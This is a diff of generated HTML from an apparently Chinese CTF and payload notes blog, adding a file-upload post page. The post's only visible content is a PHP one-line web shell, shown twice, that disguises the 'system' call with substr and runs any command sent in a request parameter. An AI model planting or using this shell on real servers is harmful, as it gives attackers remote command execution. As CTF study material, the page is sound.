+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=substr(<span class="string">&#x27;1s&#x27;</span>,<span class="number">1</span>).<span class="string">&#x27;ystem&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=substr(<span class="string">&#x27;1s&#x27;</span>,<span class="number">1</span>).<span class="string">&#x27;ystem&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/wechat.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -191,217 +283,106 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/06/04/fileUpload/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/06/04/SSRF/" class="archive-article-date">
-  	<time datetime="2021-06-04T14:28:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-04</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2021/06/04/SSRF/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">SSRF</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/06/04/SSRF/">SSRF</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">payload</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/06/04/cmdExecute/" class="archive-article-date">
-  	<time datetime="2021-06-04T14:27:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/06/04/cmdExecute/">命令执行</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">payload</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/06/04/VM2SandboxEscape/" class="archive-article-date">
-  	<time datetime="2021-06-04T14:23:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/06/04/VM2SandboxEscape/">VM2沙盒逃逸</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">payload</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/06/04/SSTI-payload/" class="archive-article-date">
-  	<time datetime="2021-06-04T14:13:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/06/04/SSTI-payload/">SSTI-payload</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">payload</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/06/04/OS%E6%8D%A2%E6%BA%90/" class="archive-article-date">
-  	<time datetime="2021-06-04T13:58:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/06/04/OS%E6%8D%A2%E6%BA%90/">OS换源</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">config</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -424,8 +405,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
